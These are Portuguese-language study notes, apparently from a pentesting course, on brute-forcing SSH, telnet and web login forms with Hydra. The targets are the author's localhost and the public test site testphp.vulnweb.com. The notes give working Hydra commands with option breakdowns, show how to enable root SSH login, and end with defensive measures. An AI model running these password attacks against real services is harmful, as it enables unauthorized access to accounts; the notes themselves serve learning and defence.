ssh - >  serviço para conexões retomars com criptografia 
telnet - >  serviço pra conexão remota sem criptografia 

Fazendo ataque no ssh na maquina localhost: 

apt-get install openssh-server 
-------------------------------------
nmap -sV 127.0.0.1 
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-13 21:28 -03
Nmap scan report for localhost (127.0.0.1)
PORT   STATE  SERVICE VERSION
22/tcp open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
23/tcp closed telnet
-------------------------------------
caso o serviço ssh esteja off: 
service ssh start 
service ssh status 
-------------------------------------
fazendo conexões ssh: 
usuári: afrogaara
ssh 127.0.0.1 -l afrogaara 
senha: gaara 
-------------------------------------
configurando ssh: 
nano /etc/ssh/sshd_config 
ctrl + w 
root 
PermitRootLogin: yes 
service ssh restart 
-------------------------------------
Hydra: 
hydra -l usuário (usuário do servidor)
hydra -L users_wordlist (wordlist de usuários)
-p senha 
-P wordlist_senhas 
-V modo verbose 
-o gera uma saída (salva as informações do ataque)  
  MODO DE USO: 
  hydra -l afrogaara -P wordlist.txt ssh 
  hydra -l afrogaara -P wordlist.txt -o /tmp/resultado 127.0.0.1 ssh -V
-x MIN:MAX:CHARSET 
  MIN:MAX 
  - > 4:4 (a senha tem 4 digítos)
  - > 1:4 (a senha tem de 1 a 4 digítos)
  
  MIN:MAX:CHARASET 
  - > 4:4a (a senha tem 4 digítos e todas são letras minusculas) 
  - > 4:4A (a senha tem 4 digítos e todas são letras maisculas) 
  - > 4:41 (a senha tem 4 digítos e todas são números) 
  - > 4:4agr (faça um brutal force com 4 digítos com as combinações de caracteres "agr")
  
  hydra -l afrogaar -x 4:4gra ssh -V
  _ _ _ _ = são 4 digítos 
  3 * 3 * 3 * 3 = 81 combinações de palavras possiveis 
  --------------------------------
  Atacando um serviço de telnet 
  - > apt-get install telnetd
  - > apt-get install xinetd
   - hydra IP -l nome do usuario -P wordlist_senhas telnet -V 
  
  ----------------------------------
   Brutalforce em formulários web Usando Hydra:
   site: acunetix 
   - > http://testphp.vulnweb.com/userinfo.php (servidor que vamos atacar)
   - > OPEN BURP SUIT
   - > Firefox -> proxy - > 127.0.0.1:8080
   
   REQUEST IN FORM interceptada pelo burp: 
  POST /userinfo.php HTTP/1.1
  Host: testphp.vulnweb.com
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0  
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  Referer: http://testphp.vulnweb.com/login.php
  Cookie: login=test%2Ftest
  uname=test&pass=test

  nano acunetix.txt 
  POST /userinfo.php HTTP/1.1
  Host: testphp.vulnweb.com
  uname=test&pass=test

uname=test&pass=tes
 1 ) Precisamos conhecer a aplicação em POST 
    - > fazer o cadastro na aplicação 
    2 coisas de interesse: 
    analisar a resposta de senhas erradas, como o servidor responde? "senha incorreta", "wrong passwords" etc...
    analisar a resposta de login após logado dentro da aplicação.
    Por que isso é importante?
    - > Precisamos falar pro hydra a condição de parada. 
    
    Quais são as disponibilidades (inputs, interações) que a página oferece antes da efetuação de login e depois?
    
   exemplo:
    usuário:afrogaara
    senha: gaara
    
    return 
    "senha incorreta" - > nano acunetix.txt 
    
   exemplo logado: 
   usuário:afrogaara
   senha: afrogaara
   
   HOME/LOGOUT/CARROS/USUÁRIO/CONFIGURAÇÕES - > resposta da aplicação 
   
hydra testphp.vulnweb.com -l test -P 10milion.txt http-post-form "/userinfo.php:uname=^USER^&pass=^PASS^:S=logout" -V

testphp.vulnweb.com - > servidor a ser atacado 

-l nome do login (usuário)
-P lista de senhas 
http-post-form - > brutalforce em formulários 
"" - > especificação do formuláio 
/userinfo.php: - > POST, página onde está o formulário 
: - > separar parâmetros (separa o host do usuário e senha) 
unane - > depende de como o site passa as informações de usuário e senha pro servidor 
^USER^ - > use o usuário especificado pelo parâmetro -l 
^PASS^: - > use a senha especificada pelo parâmetro -P ( no caso, a lista )
: - > separar parâmetros (PASS)
S=especificar algo que tenha na url após logado com login e senha 
-V modo verbose 




Evitando ataque de brutalforce em serviços: 

- > Em primeiro lugar, serviços por mais atualizados que estejam estão vulneraveis a ataque de brutalforce
- > Senhas fortes 
- > Deixar portas restritas pra um determinado número de IP
- > IDS OR IPS 
- > Políticas de seguranças que restringem o ip após uma determinada tentativa de erros 

Evitando ataque de brutalforce em formulários web:

- > capcha 
- > políticas de segurança pra restringir ip 
